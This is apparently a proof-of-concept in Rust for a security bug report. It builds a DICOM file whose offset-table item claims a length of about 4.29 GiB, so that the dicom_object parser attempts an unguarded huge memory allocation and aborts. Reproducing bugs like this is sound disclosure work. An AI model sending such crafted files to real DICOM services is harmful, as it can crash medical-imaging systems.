fn pixel_data_header() -> Vec<u8> {
    let mut v = Vec::new();
    v.extend_from_slice(&[0xE0, 0x7F, 0x10, 0x00]);
    v.extend_from_slice(b"OB");
    v.extend_from_slice(&[0x00, 0x00]);
    v.extend_from_slice(&0xFFFF_FFFFu32.to_le_bytes());
    v
}

fn item_header(len: u32) -> Vec<u8> {
    let mut v = Vec::new();
    v.extend_from_slice(&[0xFE, 0xFF, 0x00, 0xE0]);
    v.extend_from_slice(&len.to_le_bytes());
    v
}

fn build_file(dataset: &[u8]) -> Vec<u8> {
    let mut full = Vec::new();
    full.extend_from_slice(META);
    full.extend_from_slice(dataset);
    full
}

fn main() {
    // Basic Offset Table item declaring a ~4.29 GiB byte length, no actual
    // offset bytes following - isolates StatefulDecoder::read_u32's own
    // unguarded `vec.resize` as the allocation site.
    let huge_item_len: u32 = 4_294_967_280;
    let mut dataset = pixel_data_header();
    dataset.extend_from_slice(&item_header(huge_item_len));
    let full = build_file(&dataset);
    println!("input file: {} bytes", full.len());
    let result = dicom_object::from_reader(Cursor::new(full));
    match result {
        Ok(_) => println!("did not abort - parsed successfully (unexpected)"),
        Err(e) => println!("did not abort - parser returned a graceful error: {e}"),
    }
}
